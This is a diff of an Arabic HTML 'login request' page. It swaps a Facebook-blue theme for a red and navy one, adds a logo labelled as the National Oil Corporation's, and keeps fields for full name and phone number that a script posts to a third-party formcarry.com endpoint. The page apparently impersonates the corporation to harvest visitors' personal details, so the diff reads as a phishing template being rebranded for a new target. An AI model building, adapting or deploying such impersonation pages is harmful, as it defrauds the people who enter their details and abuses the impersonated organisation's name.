@@ -8,7 +8,7 @@
   <style>
     body {
       font-family: 'Cairo', sans-serif;
-      background: linear-gradient(135deg, #4267B2, #29487d);
+      background: linear-gradient(to bottom right, #002b45, #003c60);
       display: flex;
       justify-content: center;
       align-items: center;
@@ -18,18 +18,25 @@
     }
 
     .container {
-      background: white;
-      border-radius: 16px;
-      padding: 30px;
-      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
+      background-color: #fff;
+      border-radius: 20px;
+      padding: 30px 20px;
       width: 90%;
       max-width: 420px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.25);
       text-align: center;
+      border-top: 6px solid #e30613;
       position: relative;
     }
 
+    .logo {
+      width: 80px;
+      margin: 0 auto 20px;
+      display: block;
+    }
+
     h2 {
-      color: #4267B2;
+      color: #002b45;
       margin-bottom: 25px;
       font-weight: 800;
     }
@@ -38,36 +45,43 @@
       width: 100%;
       padding: 12px;
       margin-bottom: 18px;
-      border-radius: 10px;
+      border-radius: 12px;
       border: 1.5px solid #ccc;
-      font-size: 20px;
+      font-size: 18px;
       box-sizing: border-box;
       text-align: center;
+      transition: border-color 0.3s;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: #002b45;
     }
 
     button {
       width: 100%;
       padding: 12px;
-      background-color: #04be5e;
+      background-color: #e30613;
       color: white;
-      font-size: 17px;
+      font-size: 18px;
       border: none;
-      border-radius: 10px;
+      border-radius: 12px;
       cursor: pointer;
       font-weight: bold;
+      transition: background-color 0.3s;
     }
 
     button:hover {
-      background-color: #03a653;
+      background-color: #c00511;
     }
 
     #notification {
-      background-color: #f0f0f0;
+      background-color: #f4f4f4;
       border: 1px solid #ccc;
-      padding: 10px;
+      padding: 12px;
       border-radius: 10px;
       margin-bottom: 15px;
-      color: #333;
+      color: #002b45;
       display: none;
       font-size: 16px;
       animation: fadeInOut 4s forwards;
@@ -88,6 +102,9 @@
 </head>
 <body>
   <div class="container">
+    <!-- شعار المؤسسة الوطنية للنفط -->
+    <img src="uy.jpeg" alt="شعار المؤسسة الوطنية للنفط" class="logo">
+
     <h2>طلب الدخول</h2>
     <input type="text" id="fullName" placeholder="الاسم بالكامل" required>
     <input type="tel" id="myPhone" placeholder="رقم هاتفك" required>
@@ -102,7 +119,7 @@
   </div>
 
   <script>
-    const formcarryURL = "https://formcarry.com/s/pHHZOWhpgsB"; // ← استبدل هذا بالرابط الخاص بك
+    const formcarryURL = "https://formcarry.com/s/pHHZOWhpgsB";
     let step = 1;
 
     function handleAction() {
